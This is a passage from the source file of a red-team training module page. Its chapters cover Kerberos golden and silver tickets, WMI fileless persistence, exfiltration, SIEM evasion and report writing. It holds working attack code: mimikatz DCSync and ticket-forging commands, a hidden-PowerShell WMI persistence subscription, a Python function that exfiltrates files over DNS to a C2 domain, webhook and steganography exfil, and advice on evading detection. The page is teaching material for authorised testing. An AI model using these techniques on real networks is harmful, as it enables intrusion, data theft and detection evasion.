mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
# Extract: Hash NTLM: <hash>

# Step 2: Forge golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX \
  /krbtgt:KRBTGT_HASH /id:500 /groups:512 \
  /startoffset:0 /endin:600 /renewmax:10080 /ptt

# /ptt = pass-the-ticket (inject directly into session)
# Now: klist shows Administrator@corp.local ticket loaded

# Silver Ticket = forged TGS for a SPECIFIC service only
# Requires: machine account hash (not KRBTGT)
# More stealthy (no DC communication needed)
mimikatz # kerberos::golden /user:admin /domain:corp.local \
  /sid:S-1-5-21-... /target:fileserver.corp.local \
  /service:cifs /rc4:MACHINE_HASH /ptt
# Now access: \\fileserver.corp.local\C$ without DC validation`}</Pre>
        <H3>WMI Persistence (Fileless, Advanced)</H3>
        <Pre label="// WMI SUBSCRIPTION PERSISTENCE">{`# WMI subscriptions: run command when system event occurs
# Survives: reboots, AV removal, log rollover
# No files required — everything stored in WMI repository

# PowerShell WMI subscription:
$filterName = "WindowsUpdater"
$consumerName = "WindowsUpdater"
$command = "powershell -nop -w hidden -enc BASE64PAYLOAD"

# Event filter (triggers every 30 min):
$filter = Set-WmiInstance -Namespace root\subscription \
  -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 1800 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
  }

# Command-line event consumer:
$consumer = Set-WmiInstance -Namespace root\subscription \
  -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $command
  }

# Bind filter to consumer:
Set-WmiInstance -Namespace root\subscription \
  -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
  }

# Cleanup (when engagement ends):
Get-WMIObject -Namespace root\subscription -Class __EventFilter |
  Where-Object Name -eq $filterName | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer |
  Where-Object Name -eq $consumerName | Remove-WmiObject`}</Pre>
      </div>
    ),
  },
  {
    id: 'rt-08',
    title: 'Exfiltration & Avoiding Detection',
    difficulty: 'ADVANCED',
    readTime: '8 min',
    labLink: '/modules/red-team/lab',
    takeaways: [
      'Exfiltrate slowly over days/weeks to stay below DLP thresholds',
      'DNS exfiltration bypasses almost all egress filtering (organisations rarely block DNS)',
      'Steganography hides data in images — effective against DLP tools scanning file types',
      'SIEM detection focuses on velocity and anomaly — slow, low-volume exfil evades most rules',
      'Match exfiltration timing to business hours to blend into legitimate traffic patterns',
    ],
    content: (
      <div>
        <P>Getting data out of a well-defended network is harder than getting in. Modern organisations run DLP (Data Loss Prevention) appliances, inspect TLS on egress proxies, and monitor for anomalous data transfers. The key to successful exfiltration is patience and blending into legitimate traffic patterns.</P>
        <H3>DNS Exfiltration</H3>
        <Pre label="// ENCODE DATA IN DNS QUERIES">{`# DNS is almost never blocked on egress — it's too critical
# But DNS exfil to unusual domains will trigger DNS monitoring tools
# Solution: age your C2 domain, blend query patterns

# Python DNS exfil (encode data as subdomains):
import base64, subprocess, time

def exfil_file(filename, c2_domain):
    with open(filename, 'rb') as f:
        data = f.read()

    # Base32 encode (DNS safe characters only)
    encoded = base64.b32encode(data).decode().lower()

    # Split into 40-char chunks (safe DNS label length)
    chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]

    for i, chunk in enumerate(chunks):
        # query: chunk.sequencenum.filename.c2domain.com
        query = f"{chunk}.{i}.{''.join(c for c in filename if c.isalnum())}.{c2_domain}"
        subprocess.run(['nslookup', query], capture_output=True)
        time.sleep(2)  # Rate limit to avoid detection

# On your DNS server: capture all queries to c2domain.com
# Reassemble chunks from query log`}</Pre>
        <H3>Blending Exfil into Legitimate Traffic</H3>
        <Pre label="// LIVE OFF THE CLOUD">{`# Upload to legitimate cloud storage (usually whitelisted)
# OneDrive, Google Drive, Dropbox, SharePoint

# OneDrive upload via PowerShell:
$token = (Get-Content C:\Users\*\AppData\Local\Microsoft\OneDrive\tokens\*)
# Or: steal token from running OneDrive process memory via Mimikatz

# Alternative: Microsoft Teams webhook (most orgs use Teams — 100% trusted)
$webhook = "https://CORP.webhook.office.com/..."  # Teams incoming webhook
$body = @{text = [System.Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secret\data.zip"))}
Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json)

# HTTPS C2 exfil (built into your C2 framework):
# Use download command in Sliver/CS — data flows over your C2 channel
# Already encrypted, matches your malleable profile

# Steganography (evades DLP content inspection):
# Hide data inside image before uploading to social media / shared drive
steghide embed -cf photo.jpg -sf sensitive.txt -p "p@ssw0rd"
# Upload photo.jpg to Teams/Slack/email — looks like a normal photo
# Your server downloads it: steghide extract -sf photo.jpg -p "p@ssw0rd"`}</Pre>
        <H3>Evading SIEM Detection</H3>
        <Pre label="// SIEM DETECTION EVASION">{`# What SIEMs look for:
# → High-volume transfers (DLP threshold rules)
# → Access to many files in short time (ransomware heuristics)
# → Connections to newly-seen external IPs
# → Anomalous logon times (User logged in at 3am - not their pattern)
# → Multiple failed logon attempts (brute force rules)
# → Process spawning: cmd.exe spawned by Word.exe (macro detection)
# → LSASS access by non-system process (Mimikatz detection)

# Counter-strategies:
# → Slow down: 10 files/hour, not 10,000 in 5 minutes
# → Use accounts with existing access to the data (IDOR)
# → Use existing scheduled task timing for C2 callbacks
# → Only access data during business hours (8am-6pm local time)
# → Compress + encrypt before exfil (DLP can't inspect encrypted content)
# → Use the user's own cloud sync tools (OneDrive already does this)
# → Avoid LSASS — use Kerberoasting, password spray, or DCSync instead
#    (DCSync mimics normal replication traffic — much less detected)

# Detection engineering insight for blue teams:
# Alert on: LSASS access by anything other than known AV processes
# Alert on: Base64-encoded strings in PowerShell logs
# Alert on: Scheduled tasks created outside change management window
# Alert on: DNS queries to domains registered <30 days ago`}</Pre>
        <Note type="tip">The best exfiltration is data that was already supposed to leave the network. Identify legitimate data flows (automated reports, cloud sync, email) and ride those channels. An attacker exfiltrating data via the company's own Salesforce-to-S3 integration will never trigger a DLP rule because that transfer happens every hour by design.</Note>
      </div>
    ),
  },
  {
    id: 'rt-09',
    title: 'Reporting & Case Study',
    difficulty: 'INTERMEDIATE',
    readTime: '10 min',
    takeaways: [
      'Executive summary must communicate risk in business impact terms, not technical jargon',
      'Every finding needs: severity, reproduction steps, business impact, and specific remediation',
      'The attack timeline visualisation is often the most impactful element for C-suite audiences',
      'Detection gap analysis is as valuable as the findings — blue teams need to know what they missed',
      'Remediation roadmap should be prioritised by risk, not by effort — fix the highest-impact gaps first',
    ],
    content: (
      <div>
        <P>The report is the only deliverable the client keeps after the engagement ends. A technically brilliant engagement with a poor report produces zero improvement in the organisation's security posture. Report writing is a core red team skill.</P>
        <H3>Report Structure</H3>
        <Table
          headers={['Section', 'Audience', 'Content']}
          rows={[
            ['Executive Summary', 'CEO, Board', '1 page: objective, outcome, business risk, top 3 actions'],
            ['Attack Narrative', 'CISO, Security team', 'Story of the engagement — what happened, in order, with timestamps'],
            ['Technical Findings', 'Security engineers', 'Each finding: severity, description, evidence, reproduction, remediation'],
            ['ATT&CK Coverage Map', 'Detection engineers', 'Navigator layer showing which techniques succeeded vs were detected'],
            ['Detection Gap Analysis', 'Blue team', 'What SIEM/EDR missed and why — specific rule recommendations'],
            ['Remediation Roadmap', 'IT Management', 'Prioritised fix list with effort estimates and risk reduction scores'],
          ]}
        />
        <H3>Writing Impact-Driven Findings</H3>
        <Pre label="// FINDING TEMPLATE">{`# BAD FINDING (vague, not actionable):
Title: Weak Password Policy
Severity: High
Description: The organisation uses weak passwords.
Recommendation: Implement a strong password policy.

# GOOD FINDING:
Title: Password Spraying Enabled Domain Admin Access via Predictable Pattern
Severity: Critical (CVSS 9.8)
Affected Systems: corp.local domain (12,000 user accounts)
Evidence:
  - 14:23:07 — Password spray of "Winter2025!" against all AD users
  - 14:23:09 — Successful authentication as j.smith@corp.local
  - 14:25:31 — j.smith identified as member of IT Helpdesk
  - 14:47:12 — Escalated to Domain Admin via Kerberoasting + offline crack
  - 15:03:44 — DCSync executed, all domain hashes extracted
Reproduction Steps:
  1. Run kerbrute against domain: kerbrute passwordspray -d corp.local users.txt 'Winter2025!'
  2. Identify privileged accounts with weak passwords
  3. [Full reproduction steps with commands]
Business Impact:
  Complete compromise of all 847 domain-joined systems, access to all user accounts,
  ability to persist indefinitely via Golden Ticket. Estimated recovery cost: $2.3M
  (based on incident response industry averages).
Remediation:
  Immediate (0-7 days): Reset all accounts using seasonal password pattern
  Short-term (1-4 weeks): Enforce MFA on all privileged accounts via Entra ID
  Long-term (1-3 months): Deploy LAPS for local admin passwords, implement PAM solution
Detection Rule (Sigma):
  title: Password Spray - High Authentication Failure Rate
  detection:
    selection:
      EventID: 4625
    timeframe: 1m
    condition: selection | count() by SourceIPAddress > 50`}</Pre>
        <H3>Case Study: Financial Services Red Team</H3>
        <P>A fictional walk-through of a complete red team engagement applying every technique from this module.</P>
        <Pre label="// ENGAGEMENT TIMELINE">{`# Objective: Access customer financial records (PCI-DSS data)
# Duration: 6 weeks | Team: 3 operators

# WEEK 1: OSINT & Phishing Infrastructure
# → LinkedIn: 3 employees in IT Helpdesk (targets for spear phish)
# → Job posting: "Experience with CrowdStrike Falcon required" — confirmed EDR
# → crt.sh: found subdomain mail-legacy.corp-bank.com — old OWA instance
# → Shodan: mail-legacy.corp-bank.com running Exchange 2016, unpatched

# WEEK 2: Initial Access
# → Crafted spear phish: "IT Helpdesk password policy update" with GoPhish
# → Target: l.patel@corp-bank.com (IT Helpdesk, LinkedIn profile had home city)
# → Pretext matched: quarterly password change notification
# → Day 9: l.patel clicked link → Evilginx2 captured M365 session cookie → MFA bypassed
# → Sliver HTTPS implant deployed via macro in "Password Policy.docx"
# → Beacon established. C2 callbacks every 47 minutes. Undetected.

# WEEK 3: Internal Recon
# → SharpHound run at 2am (low traffic period)
# → BloodHound: l.patel → GenericWrite on ServiceAccount01 → Kerberoastable → DA path
# → ServiceAccount01 SPN: MSSQLSvc/dbserver01.corp-bank.com
# → Kerberoasted hash: $krb5tgs$23$*ServiceAccount01*...
# → Hashcat: cracked in 4h with rockyou+rules: "SQL@ccountSvc2021"

# WEEK 4: Lateral Movement
# → ServiceAccount01 authenticated to dbserver01.corp-bank.com (WMI, not PsExec)
# → dbserver01: SQL Server running as SYSTEM (misconfigured)
# → xp_cmdshell enabled → SYSTEM shell on dbserver01
# → dbserver01 in DMZ-DB VLAN — separate from corp domain
# → Found: hardcoded DA credentials in SQL job stored procedure

# WEEK 5: Crown Jewel Access
# → Authenticated to DC as Domain Admin using found credentials
# → DCSync: extracted all 12,847 domain hashes
# → Golden ticket forged (KRBTGT hash obtained)
# → Accessed PAYMENTDB01 — customer card data (PAN, CVV) — proof screenshot taken
# → Exfiltrated 100 sample records via DNS over 48 hours (proof of concept only)

# WEEK 6: Reporting & Purple Team
# → All artefacts cleaned (WMI subscriptions, scheduled tasks, dropped files)
# → Full ATT&CK Navigator layer delivered
# → Purple team: replayed attack with SOC watching — updated 14 detection rules
# → Key gap: no alert for Kerberoasting (EventID 4769 with RC4 encryption not monitored)`}</Pre>
        <Note type="tip">Purple team exercises at the end of every engagement are where the real value is created. Don't just hand over the report — replay each attack step with the blue team watching their SIEM live. This translates findings directly into improved detection engineering.</Note>
      </div>
    ),
  },
]

export default function RedTeamPage() {
  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: mono, fontSize: '0.7rem', color: '#6a3a3a' }}>
        <Link href="/" style={{ color: '#6a3a3a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>MOD-11 // RED TEAM OPERATIONS</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(255,51,51,0.08)', border: '1px solid rgba(255,51,51,0.3)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em' }}>CONCEPT</span>
          <Link href="/modules/red-team/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(255,51,51,0.1)', border: '1px solid rgba(255,51,51,0.5)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB &#8594;</Link>
        </div>
      </div>

      {/* Header */}
      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: mono, fontSize: '9px', color: '#6a3a3a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ADVANCED MODULE · MOD-11</div>
        <h1 style={{ fontFamily: mono, fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: '0 0 20px rgba(255,51,51,0.35)' }}>RED TEAM OPERATIONS</h1>
        <p style={{ color: '#6a3a3a', fontFamily: mono, fontSize: '0.75rem', lineHeight: 1.6 }}>Full campaign methodology · C2 frameworks · EDR evasion · Lateral movement · Persistence · Exfiltration · TIBER-EU</p>
      </div>

      {/* Chapter overview stats */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '12px', marginBottom: '2.5rem' }}>
        {[
          ['9', 'CHAPTERS'],
          ['~3.0hr', 'TOTAL READ'],
          ['EXPERT', 'DIFFICULTY'],
          ['MOD-11', 'IDENTIFIER'],
        ].map(([val, label], i) => (
          <div key={i} style={{ background: 'rgba(255,51,51,0.04)', border: '1px solid rgba(255,51,51,0.15)', borderRadius: '6px', padding: '1rem', textAlign: 'center' }}>
            <div style={{ fontFamily: mono, fontSize: '1.2rem', fontWeight: 700, color: accent }}>{val}</div>
            <div style={{ fontFamily: mono, fontSize: '0.6rem', color: '#4a1a1a', letterSpacing: '0.15em', marginTop: '2px' }}>{label}</div>
          </div>
        ))}
      </div>

      <ModuleCodex moduleId="red-team" accent={accent} chapters={chapters} />

      {/* Bottom navigation */}
      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #150000' }}>
        <div style={{ background: 'rgba(255,51,51,0.04)', border: '1px solid rgba(255,51,51,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: mono, fontSize: '0.65rem', color: '#4a1a1a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
          <div style={{ fontFamily: mono, fontSize: '1rem', color: accent, marginBottom: '0.5rem', fontWeight: 600 }}>MOD-11 Interactive Lab</div>
          <div style={{ fontFamily: mono, fontSize: '0.75rem', color: '#4a1a1a', marginBottom: '1.5rem' }}>18 steps &middot; 465 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/red-team/lab" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.85rem', color: accent, padding: '12px 32px', border: '1px solid rgba(255,51,51,0.6)', borderRadius: '6px', background: 'rgba(255,51,51,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(255,51,51,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <Link href="/modules/social-engineering" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.75rem', color: '#4a1a1a' }}>&#8592; MOD-10: SOCIAL ENGINEERING</Link>
          <Link href="/modules/wireless-attacks" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.75rem', color: '#4a1a1a' }}>MOD-12: WIRELESS ATTACKS &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
